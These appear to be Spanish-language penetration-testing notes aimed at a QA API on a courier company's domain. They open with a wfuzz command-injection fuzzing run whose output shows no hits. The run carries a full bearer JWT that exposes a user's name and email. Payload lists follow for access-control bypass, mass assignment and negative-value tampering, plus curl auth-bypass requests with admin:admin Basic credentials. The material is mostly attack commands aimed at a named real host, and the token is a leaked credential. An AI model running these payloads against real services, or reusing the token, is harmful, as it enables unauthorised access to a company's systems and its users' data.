
``` shell
┌──(kali㉿kali)-[~/preenvios]
└─$ # Campo COMANDO (A03 Injection)
wfuzz -c -z file,/usr/share/seclists/Fuzzing/command-injection-commix.txt --hc 400,415,401,405 \
-H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICI2MVVaR2RXOFJQSUZYazBYdEJoZy1hRXFfQk9QSjB0X0tTaDY1OFp2ODZ3In0.eyJleHAiOjE3NzI0NjQ3NDcsImlhdCI6MTc3MjQ2NDQ0NywianRpIjoib25ydHJvOmFkMTg5YzkxLTAzNzUtNjk1Ni03YmUxLTRiMjU3NDIwZjc4MSIsImlzcyI6Imh0dHBzOi8va2V5Y2xvYWtxYS1wcml2YWRvLmludGVycmFwaWRpc2ltby5jby9yZWFsbXMvSW50ZXJyYXBpZGlzaW1vIiwic3ViIjoiODkwYThmNzItNTY1Yy00MjlhLWFkZjMtZTg2NmRmMDQzOGM5IiwidHlwIjoiQmVhcmVyIiwiYXpwIjoiVmVudGFDcmVkaXRvIiwic2lkIjoiNTc5ZDBjZWYtNjIxZi1hYTkxLWI3MDUtNDk4ZjRlMDQwYWFhIiwiYWNyIjoiMSIsImFsbG93ZWQtb3JpZ2lucyI6WyJodHRwOi8vbG9jYWxob3N0OjUyNDQiXSwicmVzb3VyY2VfYWNjZXNzIjp7IlZlbnRhQ3JlZGl0byI6eyJyb2xlcyI6WyJjb3RpemFkb3IubGVjdHVyYS5wcml2YWRvIiwiY2VudHJvX3NlcnZpY2lvLmxlY3R1cmEiLCJpbnRlcnBheSIsImVzdGFkb3NfZ3VpYXMubGVjdHVyYSIsImdlb2dyYWZpY2EubGVjdHVyYSIsImltcHJlc2lvbi5sZWN0dXJhLnByaXZhZG8iLCJjb3RpemFkb3IubGVjdHVyYSIsInByZWVudmlvcy5sZWN0dXJhLnByaXZhZG8ub25wcmVtaXNlcyIsImltcHJlc2lvbi5sZWN0dXJhIiwicHJlZW52aW9zLmVzY3JpdHVyYSJdfX0sInNjb3BlIjoicHJvZmlsZSBzY29wZS1pZC1jbGllbnQtaW50ZXIgZW1haWwiLCJlbWFpbF92ZXJpZmllZCI6ZmFsc2UsIm5hbWUiOiJEcm9wc2hpcHBpbmcgUGFnbyIsInByZWZlcnJlZF91c2VybmFtZSI6InVzci1jcC1kcjBwNWNoMXAxbmciLCJnaXZlbl9uYW1lIjoiRHJvcHNoaXBwaW5nIiwiZmFtaWx5X25hbWUiOiJQYWdvIiwiZW1haWwiOiJsaWRlci5lY29tbWVyY2VAaW50ZXJyYXBpZGlzaW1vLmNvbSJ9.HHQ0n9jzQwkdNPfGkt-a8DbzAB5D0fPGjmmXLyh31fPsRi-Z7_Msbav8xeshTelPXfaxuwdncaOGvDrj6SpynThIzazTfvvyCW1Jm2nq-QR2GazYc0nq14HrxX5ziq3g5LWw9hwmdjqItuT0O4pEIbVNi-jYlL6qLmO8FFxyF3wIi39fnxHu-BpKMfIotg4HtxZg6ddNmhrrGnmoHD-woULrUFmUoo8we-rciDHIMSLnYc7HMH5DQ6B46gbp-N3Y9q_ss2BdH5JjumDTOX0fG3Hf1cpNaZeqbFfN3cJt_Y7_lbDk3VEvFPI9a2zi2yG2bvQGIZtIaNEp48WTN4bPYQ" \
-d '{"Comando": "FUZZ"}' \
"https://qawww3.interrapidisimo.co/PreenvioPeatonCommandServicesQA/api/v1/PreEnvios/InsertarPreenvioClientePeaton"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://qawww3.interrapidisimo.co/PreenvioPeatonCommandServicesQA/api/v1/PreEnvios/InsertarPreenvioClientePeaton
Total requests: 8262

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                            
=====================================================================


Total time: 11.63911
Processed Requests: 8262
Filtered Requests: 8262
Requests/sec.: 709.8476


```

##  BROKEN ACCESS CONTROL (A01) - Payloads clave:


```
// 1. EsAdmin bypass
"EsAdmin": false,
"EsAdmin": 1,
"EsAdmin": "true",
"EsAdmin": null

// 2. ID bypass
"IdCliente": 0,
"IdCliente": -1,
"IdCliente": "admin",
"IdSucursal": 0

// 3. Negative values
"ValorTotal": -999999,
"ValorDescuento": 99999999
```

## MASS ASSIGNMENT (A05) - Campos no documentados:

```
// Probar estos campos adicionales:
"admin": true,
"isAdmin": true,
"role": "admin",
"bypass": true,
"debug": true,
"test": true,
"IdUsuario": 1,
"permissions": ["*"]
```

## AUTH BYPASS (A01) - Rápido:

bash

```
# Sin token
curl -X POST [ENDPOINT] -d @payload.json -v

# Token vacío/manipulado
-H "Authorization: Bearer "
-H "Authorization: Basic YWRtaW46YWRtaW4="
```